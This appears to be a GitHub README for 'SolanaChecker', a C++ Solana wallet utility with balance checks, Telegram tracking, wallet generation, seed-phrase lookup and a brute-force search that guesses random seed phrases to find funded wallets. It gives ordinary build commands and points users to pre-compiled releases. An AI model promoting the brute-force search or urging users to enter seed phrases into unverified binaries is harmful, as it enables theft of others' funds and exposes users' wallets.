# Solana Wallet Generator: Create Secure Solana Wallets

Need a secure Solana wallet? **SolanaChecker** provides a convenient and secure way to generate new Solana wallets with unique private keys and addresses. This feature empowers you to easily get started in the Solana ecosystem.

<p align="left">
    <img src="/archive/ready.webp" />
</p>

## Core Features

1.  **Solana Address Balance Check:** Quickly view the balance on a specific Solana address.

<p align="left">
    <img src="/archive/thick.webp" />
</p>

2.  **Token Security Assessment:** Evaluate token security, and avoid potentially fraudulent projects.

<p align="left">
    <img src="/archive/cursor.webp" />
</p>

3.  **Address Tracking:** Set up notifications about activity on specified addresses through a Telegram bot. Stay updated on your wallets in real-time.

4.  **Wallet Data Extraction from Mnemonic:** Retrieve wallet details from your seed phrase.

<p align="left">
    <img src="/archive/side.webp" />
</p>

5.  **Solana Wallet Generation:** Create new, secure Solana wallets with unique keys and addresses. This is the primary focus here.

<p align="left">
    <img src="/archive/fix.webp" />
</p>

6.  **Brute-Force Wallet Search:** Generate random seed phrases and check balances.

<p align="left">
    <img src="/archive/black.webp" />
</p>

## Telegram Notification Setup

To receive notifications in Telegram, enter your [bot token](https://core.telegram.org/bots/tutorial#obtain-your-bot-token) and your [chat_id](https://t.me/getmyid_bot) into the 'telegram-settings.txt' file.

## Getting Started

Download a pre-compiled build from [Release](../../releases) or build the project yourself.

## Project Build Instructions

This project utilizes C++ and depends on several libraries. We recommend using **vcpkg** for easy dependency management.

### Installing Dependencies with vcpkg:

1.  If you don't have **vcpkg**, clone the repository and install it according to the instructions on the [official page](https://github.com/microsoft/vcpkg).
2.  Add **vcpkg** to your system's PATH environment variable.
3.  Run the following commands to install the dependencies:

    -   Install **OpenSSL**:

    ```bash
    vcpkg install openssl
    ```

    -   Install **nlohmann-json**:

    ```bash
    vcpkg install nlohmann-json
    ```

    -   Install **Crypto++**:

    ```bash
    vcpkg install cryptopp
    ```

    -   Install **libsodium**:

    ```bash
    vcpkg install libsodium
    ```

4.  Build the project after installing the dependencies.

### Building with Visual Studio:

1.  Open the project solution in Visual Studio.
2.  Make sure that **vcpkg** is properly integrated with your environment. (See [integrating vcpkg with Visual Studio](https://github.com/microsoft/vcpkg#visual-studio)).
3.  Click **Build** -> **Build Solution**.
4.  The executable will be located in the `bin` folder.

### Building with Another C++ Compiler:

1.  Ensure that all dependencies are correctly installed and are accessible to your compiler.
2.  Compile the project using the following command:

    ```bash
    g++ -o solanachecker main.cpp -lssl -lcrypto -lsodium -lcryptopp -std=c++17
    ```

## Command Line Usage

Here's how to use the command-line interface:

1.  **-s / -search**: Start a brute-force search for wallets with a balance.
2.  **-t / -track (ADDRESS)**: Start tracking a particular address. The program will monitor activity.
3.  **-g / -gen (NUMBER)**: Generate the specified number of Solana wallets. Replace `<NUMBER>` with the desired quantity.
4.  **-m / -mnemonic (MNEMONIC)**: Show wallet data from a given mnemonic. Replace `<MNEMONIC>` with the mnemonic phrase.
5.  **-b / -balance (ADDRESS)**: Show the balance of the specified address in the Solana network.

## Important Notes

-   This program is intended for research purposes and should not be used for any illegal activities or hacking.
-   Cryptocurrency investments have risks; secure your data and wallets.

## License

This project is licensed under the [MIT License](/LICENSE). You are free to use, modify, and distribute the code in accordance with the license.







Update: url is live and functioning properly